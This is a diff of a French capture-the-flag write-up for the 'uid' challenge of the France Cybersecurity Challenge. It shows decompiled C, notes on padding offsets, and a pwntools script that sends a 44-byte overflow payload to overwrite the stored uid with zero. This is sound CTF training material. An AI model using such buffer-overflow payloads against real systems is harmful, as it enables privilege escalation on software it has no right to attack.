@@ -8,7 +8,7 @@ undefined8 main(void)
 {
   undefined local_38 [44];
   __uid_t local_c;
- 
+
   local_c = geteuid();
   printf("username: ");
   fflush(stdout);
@@ -25,11 +25,17 @@ undefined8 main(void)
 
 ## Padding
 
+![](./stack.png)
+
+Le segfault plus loin que prévu dans `ret` à 0x38 = 56:
+
 ![](./padding.png)
 
-## Win
+On cherche à mettre `uid = 0`. Or la taille du `uid_t` stockant l'uid est de 4 octets ainsi on peut tester:
 
-On cherche à mettre `uid = 0`:
+![](./padding2.png)
+
+## Win
 
 Méthode 1:
 
@@ -39,13 +45,11 @@ from pwn import *
 
 s = remote('challenges.france-cybersecurity-challenge.fr',port=2100)
 
-#p = s.process('./uid')
-
-#recupere l'adresse leak du buffer 
+#recupere l'adresse leak du buffer
 s.recvuntil('username: ', drop=True)
 
-payload = 'A'*56 + '\x00'*100
-s.sendline(payload) 
+payload = 'A'*44 + '\x00'
+s.sendline(payload)
 s.interactive()
 s.close()
 ```
